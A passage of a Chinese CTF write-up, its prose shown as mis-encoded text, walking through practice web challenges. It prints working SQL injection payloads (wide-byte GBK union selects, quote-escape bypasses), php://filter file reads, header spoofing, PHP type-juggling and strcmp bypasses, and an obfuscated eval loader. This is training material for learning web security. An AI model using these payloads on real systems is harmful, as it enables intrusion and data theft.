$md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; æ­¤é¢˜æœ‰å…³MD5ç¢°æ’ï¼Œå“ˆå¸Œç›¸ç­‰çš„é—®é¢˜ï¼Œè¯¦è§£MD5ç¢°æ’çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« MD5ç¢°æ’å’ŒMD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰ å¤§æ¦‚å°±æ˜¯ï¼š åœ¨PHPçš„æ•°çš„å¤„ç†ä¸­ï¼Œ0å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆ0 æ‰€ä»¥æˆ‘ä»¬GETè¯·æ±‚a=s878926199a,è¿›è¡Œç¢°æ’ ç­¾åˆ°2é¢˜ç›®é“¾æ¥ æ–¹å¼ä¸€ æ·»åŠ è¾“å…¥æ¡†çš„å€¼`value=&quot;zhimakaimen&quot;`,ç„¶åç‚¹å‡»å¼€é—¨ æ–¹å¼äºŒ ä¿®æ”¹è¾“å…¥æ¡†çš„æœ€å¤§è¾“å…¥é•¿åº¦`maxlength=&#39;11&#39;`ï¼Œç„¶ååœ¨è¾“å…¥æ¡†è¾“å…¥zhimakaimen,å†æäº¤å³å¯ è¿™é¢˜ä¸æ˜¯WEBé¢˜ç›®é“¾æ¥ ä¸‹è½½åŠ¨å›¾ï¼Œç›´æ¥æ–‡æœ¬æ–¹å¼æ‰“å¼€ï¼ˆnotepadä¹Ÿokï¼‰ å±‚å±‚é€’è¿›é¢˜ç›®é“¾æ¥ 1F12 # æŸ¥çœ‹æºä»£ç  è®¿é—®æ­¤é¡µé¢SO.html ç»§ç»­F12,è®¿é—®S0.html ç»§ç»­è®¿é—®ï¼ŒSO.htm ç»§ç»­è¿›å…¥,S0.htm è¿›å…¥404.html,ç‚¹å‡»å›é€€å°±çœŸçš„å›å»äº†(hhh),F12åˆ†æä¸€æ³¢ AAencodeé¢˜ç›®é“¾æ¥ æ¢ç¼–ç å å¤åˆ¶ï¼Œæ§åˆ¶å°è¿è¡Œï¼Œå¼¹å‡ºFLAG å•èº«äºŒåå¹´é¢˜ç›®é“¾æ¥ çœŸçš„æ˜¯è€ƒéªŒæ‰‹é€Ÿçš„é¢˜? æˆ‘çœ‹æœªå¿… BurpæŠ“åŒ… php decode12345678910111213141516&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE; &#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; å¤åˆ¶åˆ°phpæ–‡ä»¶è¿è¡Œ å°†evalæ”¹æˆprint_r,å› ä¸ºæ­¤å‡½æ•°çš„æ‰§è¡Œç»“æœæ˜¯è¿”å›å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰“å°å‡ºæ¥ æ–‡ä»¶åŒ…å«é¢˜ç›®é“¾æ¥ ç‚¹å‡»click me? noè¿›å…¥äº†æ–‡ä»¶åŒ…å«é¡µé¢ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨php://filteråè®®åŒ…å«index.phpæ–‡ä»¶ php://filter/read=convert.base64-encode/resource=index.php å°†è¾“å‡ºçš„base64åŠ å¯†çš„å¯†æ–‡ï¼Œè¿›è¡Œè§£ç  æ–‡ä»¶æ³¨é‡Šä¸­åŒ…å«flag å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨é¢˜ç›®é“¾æ¥ burpåˆç™»åœºäº† Download~!é¡µé¢æ— æ³•è®¿é—®,å¾…æ›´æ–°ã€‚ã€‚ã€‚ COOKIEä¿®æ”¹cookieçš„å€¼ä¸º1ï¼Œå³å¯ MYSQLé¢˜ç›®é“¾æ¥ è®¿é—®robots.txtæ–‡ä»¶ å‘ç°robots.txtä¸­phpä»£ç ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹ 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#x27;$id&#x27;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; æ ¹æ®ä»¥ä¸Šä»£ç åˆ†æï¼Œè¿™é‡Œæ˜¯åˆ©ç”¨intval()å‡½æ•°æ¥ç»•è¿‡ï¼Œè¾“å‡ºflagã€‚å› æ­¤ï¼Œurlä¼ å…¥id=1024.1 intval()1234567891011121314151617181920212223intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚ intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ã€‚PHP 4, PHP 5, PHP 7è¯­æ³•int intval ( mixed $var [, int $base = 10 ] )å‚æ•°è¯´æ˜ï¼š$varï¼šè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼ã€‚$baseï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼šå¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† &quot;0x&quot; (æˆ– &quot;0X&quot;) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥ &quot;0&quot; å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œå°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚è¿”å›å€¼æˆåŠŸæ—¶è¿”å› var çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚æœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(&#x27;1000000000000&#x27;) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚å­—ç¬¦ä¸²æœ‰å¯èƒ½è¿”å› 0ï¼Œè™½ç„¶å–å†³äºå­—ç¬¦ä¸²æœ€å·¦ä¾§çš„å­—ç¬¦ã€‚ ä¸¾ä¾‹ï¼š 12345678910111213141516171819&lt;?phpecho intval(42); // 42echo intval(4.2); // 4echo intval(&#x27;42&#x27;); // 42echo intval(&#x27;+42&#x27;); // 42echo intval(&#x27;-42&#x27;); // -42echo intval(042); // 34echo intval(&#x27;042&#x27;); // 42echo intval(1e10); // 1410065408echo intval(&#x27;1e10&#x27;); // 1echo intval(0x1A); // 26echo intval(42000000); // 42000000echo intval(420000000000000000000); // 0echo intval(&#x27;420000000000000000000&#x27;); // 2147483647echo intval(42.88, 8); // 42ï¼ŒæŒ‘ä¸€ä¸ªè¯¦è§£ï¼šè¿™é‡Œæ˜¯å…ˆå°†42.88å–æ•´ï¼Œå†å°†å®ƒä»¥8è¿›åˆ¶è½¬æ¢ä¸º10è¿›åˆ¶echo intval(&#x27;42&#x27;, 8); // 34echo intval(array()); // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;)); // 1?&gt; å› æ­¤ï¼Œæ— è®ºè¿™ä¸ªintvalå‡½æ•°$baseç”¨çš„å“ªä¸ªè¿›åˆ¶æ¥è½¬æ¢çš„ï¼Œéƒ½æ˜¯å…ˆå°†$varå–æ•´ï¼Œå†å°†$varä»$baseè¿›åˆ¶è½¬æ¢ä¸º10è¿›åˆ¶ GBK Injectioné¢˜ç›®é“¾æ¥ è®¿é—®ï¼Œéœ€è¦ä¼ idè¿™ä¸ªå‚æ•° ä¸€ä¸‹å­éƒ½æƒ³åˆ°sqlæ³¨å…¥ï¼Œç»“æœä¼šæ˜¾å‘ç°&#39;å’Œ&quot;ç­‰ç‰¹æ®Šå­—ç¬¦éƒ½è¢«è½¬ä¹‰ ç„¶åå‘ç°å¯ä»¥åˆ©ç”¨å®½å­—èŠ‚æ³¨å…¥(æ²¡æœ‰è¢«è½¬ä¹‰) å…ˆåˆ¤æ–­å­—æ®µæ•°?id=1%df&#39; order by 3 %23 ç„¶åæˆ‘ä»¬è‡ªå®šä¹‰å›æ˜¾id=1%df&#39; and 1=2 union select 1,2 %23 æˆ‘ä»¬æ¥ä¸‹æ¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤ çˆ†æ•°æ®åº“ï¼ˆè¿™é‡Œåªéœ€è¦çŸ¥é“å½“å‰æ•°æ®åº“å³å¯ï¼‰ çˆ†è¡¨ çˆ†å­—æ®µ æŸ¥è¯¢æƒ³è¦çš„å€¼ æ³¨ï¼šä¸€ä¸‹æ“ä½œå…¨åœ¨ä¿®æ”¹è‡ªå®šä¹‰å›æ˜¾ä¸­ä½“ç° 1).æŸ¥çœ‹å½“å‰æ•°æ®åº“ ?id=1%df&#39; and 1=2 union select 1,database() %23ï¼Œå…¶ä¸­database()è¡¨ç¤ºå½“å‰æ•°æ®åº“å 2).æŠ¥è¡¨( sae-chinaloverè¿™ä¸ªæ•°æ®åº“çš„è¡¨) æ³¨æ„,å› ä¸ºå•å¼•å·å’ŒåŒå¼•å·è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨å•å¼•å·æ¥è¿›è¡Œçº¦æŸã€‚æˆ‘ä»¬å¯ä»¥å°†sae-chinaloverè½¬æ¢ä¸º16è¿›åˆ¶ æ³¨æ„ï¼š7361652d6368696e616c6f766572==sae-chinalover,å…¶ä¸­æ²¡æœ‰å¼•å·ï¼Œ0xè¡¨ç¤ºåé¢çš„æ•°å­—æ˜¯16è¿›åˆ¶æ•° 3).é€šè¿‡è¡¨( ctf,ctf2,ctf3,ctf4,gbksqli,news )çˆ†å­—æ®µ è¿™é‡Œå‘¢,å› ä¸ºflagåœ¨ctf4ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åªæ‹¿ä¸€ä¸ªæ¥ä¸¾ä¾‹ã€‚å…¶ä½™çš„æ–¹æ³•éƒ½å¤§åŒå°å¼‚ ![image-20191107090128927](https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107090128927.png) è·å¾—ä¸¤ä¸ªå­—æ®µï¼Œid,flag,æˆ‘ä»¬ç›´æ¥é€šè¿‡æŸ¥è¯¢è¾“å‡º,?id=1%df&#39; and 1=2 union select 1,group_concat(flag) from ctf4 %23 /x00é¢˜ç›®é“¾æ¥ è¿›å»å°±æ˜¯ä¸€æ®µphpä»£ç  12345678910&lt;?php if (isset ($_GET[&#x27;nctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE) echo &#x27;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#x27;; else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#x27;; &#125;?&gt; å› ä¸ºereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨00æˆªæ–­ æˆ‘ä»¬æ„é€ nctf=%00#biubiubiuï¼Œ å°è¯•ä¸€æ¬¡ï¼Œå‘ç°å¤±è´¥ åé¢æ‰ååº”è¿‡æ¥, ==urlä¸­çš„#åé¢çš„å­—ç¬¦éƒ½ä¼šè¢«æµè§ˆå™¨è§£è¯»ä¸ºä½ç½®æ ‡è¯†ç¬¦ã€‚å› æ­¤ï¼Œè¿™äº›å­—ç¬¦éƒ½ä¸ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å¯¹#è¿›è¡Œurlç¼–ç == bypass againé¢˜ç›®é“¾æ¥ åˆæ˜¯ä»£ç  123456789&lt;?phpif (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])if (md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Wrong.&#x27;;&#125;?&gt; ä¸€çœ‹ä»£ç ï¼Œå°±çŸ¥é“äº†ï¼Œåˆæ˜¯md5å€¼çš„ç¢°æ’é—®é¢˜,å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« MD5ç¢°æ’å’ŒMD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰ å˜é‡è¦†ç›–é¢˜ç›®é“¾æ¥ è¿›å»ä¸€çœ‹ ç‚¹è¿›å»ï¼Œå‘ç°ä»¥ä¸‹ä»£ç ,åˆ†æä¸€æ³¢ 123456789&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; å¯ä»¥å‚è€ƒCTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´ï¼Œè¿™é‡Œä¸»è¦å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡extract()è¿™ä¸ªå‡½æ•° extract()ä¼šæŠŠç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åçš„å€¼æ›¿æ¢æ‰ ,æ‰€ä»¥æˆ‘ä»¬é€šè¿‡burpæ¥æ„é€ å€¼ PHPæ˜¯æœ€å¥½çš„è¯­è¨€æ— æ³•è®¿é—®â€¦ å¾…æ›´æ–° ä¼ªè£…è€…é¢˜ç›®é“¾æ¥ ä¸€çœ‹åˆ°æœ¬åœ°è®¿é—®ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°äº†X-Forwarded-For: 127.0.0.1ï¼Œæ‰“å¼€burpï¼Œæ·»åŠ å­—æ®µ ä½†æ˜¯å¾ˆé—æ†¾ï¼Œåœ¨è¿™é‡Œè¡Œä¸é€šï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡Client-IP:127.0.0.1æ¥ä¼ªé€  è¿˜æœ‰ä¸€ä¸‹å‡ ç§ä¼ªé€ æ–¹å¼: 12345X-Client-IP:1.1.1.1X-Remote-IP:2.2.2.2X-Remote-Addr:3.3.3.3X-Originating-IP:4.4.4.4X-Forwarded-For:5.5.5.5 Headeré¡µé¢æ— æ³•è®¿é—®ï¼Œå¾…æ›´æ–°â€¦ ä¸Šä¼ ç»•è¿‡é¢˜ç›®é“¾æ¥ ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨%00æˆªæ–­ä¸Šä¼  å‘ç°æ²¡ç”¨ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡,ç„¶åå°†æ–‡ä»¶åæ”¹æˆ1.jpg,ä½†æ˜¯æˆ‘å°è¯•ä½¿ç”¨ä¿®æ”¹hexä¸º00ä¾¿å¯ä»¥(è‡³ä»Šæœ‰ç‚¹è¿·ï¼Œä¸çŸ¥é“ä¸ºå•¥) SQLæ³¨å…¥1é¢˜ç›®é“¾æ¥ è¿™ä¸ªé¢˜ç‰¹åˆ«ç®€å• å‘ç°ä¸éœ€è¦ä»€ä¹ˆçŒœæµ‹ï¼Œæºä»£ç éƒ½ç›´æ¥ç»™ä½ ï¼Œhhh 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#x27;&quot;.$user.&quot;&#x27;) and (pw=&#x27;&quot;.$pass.&quot;&#x27;)&quot;; #é‡ç‚¹ echo &#x27;&lt;/br&gt;&#x27;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;&lt;/html&gt; $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;é‡ç‚¹æ˜¯è¿™ä¸€è¡Œä»£ç ,æˆ‘ä»¬å¾—æƒ³åŠæ³•ç»•è¿‡ åœ¨ç”¨æˆ·æ¡†è¾“å…¥admin,æç¤ºå¦‚ä¸‹ æˆ‘ä»¬ç›´æ¥é—­åˆå•å¼•å·ï¼Œç„¶åæ³¨é‡Šåé¢çš„ä»£ç ,æ‹¿åˆ°flag pass checké¢˜ç›®é“¾æ¥ ä»£ç ï¼š 1234567891011121314&lt;?php$pass=@$_POST[&#x27;pass&#x27;];$pass1=***********;//è¢«éšè—èµ·æ¥çš„å¯†ç if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; strcmp()å‡½æ•°çš„ä½œç”¨ php5.3ä¹‹å‰çš„strcmpçš„æ¼æ´å½“å‚æ•°ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¯¹è±¡æˆ–è€…æ•°ç»„æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›0 é€šè¿‡ä»¥ä¸Šæˆ‘ä»¬çŸ¥é“ä¼ å…¥ä¸€ä¸ªæ•°ç»„å³å¯ç»•è¿‡ï¼Œå› ä¸ºPOSTä¼ å‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨burp æ³¨ï¼šPOSTè¯·æ±‚ èµ·åå­—çœŸéš¾é¢˜ç›®åœ°å€ æºä»£ç ï¼š 123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=&#x27;*******&#x27;;if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; é¢˜ç›®è¦æ±‚ä¸èƒ½è¾“å…¥æ•°å­—ï¼Œä½†æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»å’Œ54975581388ç›¸åŒç”¨å’Œ54975581388ç­‰å€¼çš„16è¿›åˆ¶è¡¨ç¤ºï¼Œå¾ˆå·§ï¼Œå…¨ä¸æ˜¯æ•°å­—ï¼Œå°±æˆåŠŸäº† å½“é‡åˆ° ä¸æ•°å­—å­—ç¬¦ä¸²å¯¹æ¯”æ ¡éªŒçš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•è½¬æ¢ä¸ºç­‰å€¼çš„16è¿›åˆ¶å­—ä¸² å¯†ç é‡ç½®é¢˜ç›®é“¾æ¥ Y3RmdXNlcg==base64è§£ç ä¸ºctfyuser æ€è·¯å°±æ˜¯å°†urlçš„å€¼adminä½¿ç”¨base64ç¼–ç ï¼Œè¾“å…¥æ¡†çš„è´¦å·ä¹Ÿæ”¹æˆadmin adminä½¿ç”¨base64åŠ å¯†å¾—YWRtaW4= php ååºåˆ—åŒ–(æš‚æ—¶æ— æ³•åš)æš‚æ—¶æ— æ³•åšâ€¦å¾…æ›´æ–° SQL Injectioné¢˜ç›®é“¾æ¥ F12å‘ç°phpä»£ç ,æˆ‘ä»¬åˆ†æä¸€æ³¢ 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#x27;Invalid password!&#x27;);&#125;echo $flag;--&gt; æ³¨æ„ä¸Šé¢clean functionä¸­çš„htmlentities()å‡½æ•°ï¼Œå®ƒä¼šæŠŠè¾“å…¥å­—ç¬¦ä¸­çš„ â€™ æˆ–è€… â€ è½¬å˜ä¸ºhtmlå®ä½“ï¼Œè¿™æ ·ä¸€æ¥å°±æ— æ³•é—­åˆæºä»£ç ä¸­çš„ â€™ äº†ï¼Œè¿˜æœ‰å°±æ˜¯ï¼Œå¦‚æœphpçš„magic_quotes_gpcæ˜¯å¼€å¯çŠ¶æ€çš„è¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„è½¬ä¹‰ç¬¦ä¹Ÿä¼šè¢«å»æ‰çš„ï¼Œä¸è¿‡æ—¢ç„¶è¿™é“é¢˜ç›®èƒ½åšï¼Œè¯´æ˜æˆ‘ä»¬æ˜¯å¯ä»¥ä½¿ç”¨è½¬ä¹‰ç¬¦ \\ ï¼Œæˆ‘ä»¬è§£è¿™é“é¢˜çš„å…³é”®å°±æ˜¯ä½¿ç”¨è½¬ä¹‰ç¬¦ \\ æ¥è®©æºä»£ç ä¸­â€˜SELECT * FROM users WHERE name=&#39;â€˜.$username.â€™&#39; AND pass=&#39;â€˜.$password.â€™&#39;;â€™$usernameåé¢çš„ â€™ å¤±æ•ˆï¼Œåªè¦ è¿™ä¸ª â€™ å¤±æ•ˆï¼Œå°±èƒ½é—­åˆname=åé¢çš„ â€™ ï¼Œè¦è¾¾åˆ°è¿™ä¸€ç›®çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è®©username=admin \\å³å¯ï¼Œè®©åä½¿passwordçš„å€¼ä¸ºä¸€ä¸ªæ°¸çœŸå¼(or 1=1)å°±å¯ä»¥å¾—åˆ°è¿™é“é¢˜çš„flagè¿™æ ·æäº¤çš„æ•°æ®ï¼Œä¼šå¯¼è‡´æºä»£ç ä¸­çš„SQLè¯­å¥å˜ä¸ºï¼š 1SELECT * FROM users WHERE name=&#x27;admin \\&#x27; AND pass=&#x27; or 1=1 ?username=admin \\&amp;password=or 1=1%23 ,%23æ˜¯#çš„urlç¼–ç  ç»¼åˆé¢˜é¢˜ç›®é“¾æ¥ æˆ‘ä»¬ç›´æ¥å°†å­—ç¬¦æ”¾åœ¨æ§åˆ¶å°æ‰§è¡Œ æˆ‘ä»¬è®¿é—®è¿™ä¸ªé¡µé¢ history of bash,åœ¨linuxç³»ç»Ÿä¸­ï¼Œhistoryå‘½ä»¤éƒ½ä¿å­˜åœ¨å®¶ç›®å½•ä¸‹çš„.bash_historyæ–‡ä»¶ä¸­ è®¿é—®.bash_historyå‘ç°å‹ç¼©åŒ… è®¿é—®flagbak.zipæ–‡ä»¶ systemï¼ˆæš‚æ—¶æ— æ³•åšï¼‰å¾…æ›´æ–°â€¦ SQLæ³¨å…¥2é¢˜ç›®é“¾æ¥ å‘ç°æºä»£ç ,åˆ†æä¸€ä¸‹ 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login II&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27;$user&#x27;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=&quot;Username&quot;&gt;&lt;input type=password name=pass value=&quot;Password&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;&lt;/html&gt; 1.ç”¨postæ–¹æ³•è¾“å…¥ä¸¤ä¸ªå˜é‡ 2.è¾“å…¥çš„å˜é‡passçš„å€¼ç»è¿‡MD5åŠ å¯†äº† 3.ä¸­å­˜å‚¨çš„æ˜¯sqlå‘½ä»¤çš„ç»“æœé›† 4.å¦‚æœå˜é‡å­˜åœ¨ï¼Œå¹¶ä¸”ï¼Œ$passä¸$query[pw]ç›¸ç­‰ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘åœ¨$userä¸ŠåŠ ä¸Šä¸€ä¸ªunionè¯­å¥ï¼Œå³å‘$queryçš„ç»“æœé›†ä¸­åœ¨åŠ ä¸€æ¡ï¼ŒåŒæ—¶èƒ½å¤Ÿä½¿å¾—æ¡4æˆç«‹ æ³¨æ„éœ€è¦åœ¨unionå‰åŠ ä¸€ä¸ª â€˜ ç”¨äºé—­åˆâ€™$uesrâ€™å‰çš„é‚£ä¸ªå¼•å·ï¼Œ#æ˜¯ä¸ºäº†æ³¨é‡Šç‚¹åé¢çš„é‚£ä¸ªå¼•å· ç»¼åˆé¢˜2è¿˜ä¸ä¼šï¼Œå¾…æ›´æ–°â€¦ å¯†ç é‡ç½®21234TIPS:1.ç®¡ç†å‘˜é‚®ç®±è§‚å¯Ÿä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°2.linuxä¸‹ä¸€èˆ¬ä½¿ç”¨viç¼–è¾‘å™¨ï¼Œå¹¶ä¸”å¼‚å¸¸é€€å‡ºä¼šç•™ä¸‹å¤‡ä»½æ–‡ä»¶3.å¼±ç±»å‹bypass é¢˜ç›®é“¾æ¥ F12ï¼Œå‘ç°ç®¡ç†å‘˜é‚®ç®±åœ°å€ åœ¨linuxç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶å†™å…¥å‡ºç°å¼‚å¸¸ï¼Œä¼šåœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ª.filename.swpçš„æ–‡ä»¶ # æ³¨filenameæ˜¯ä½ çš„æ–‡ä»¶åï¼Œæˆ‘ä»¬è®¿é—®.submit.php.swp æºä»£ç åˆ†æä¸€æ³¢ 1234567891011121314151617181920212223242526272829303132333435363738394041424344........è¿™ä¸€è¡Œæ˜¯çœç•¥çš„ä»£ç ......../*å¦‚æœç™»å½•é‚®ç®±åœ°å€ä¸æ˜¯ç®¡ç†å‘˜åˆ™ die()æ•°æ®åº“ç»“æ„---- è¡¨çš„ç»“æ„ `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT &#x27;0&#x27;, PRIMARY KEY (`id`)) 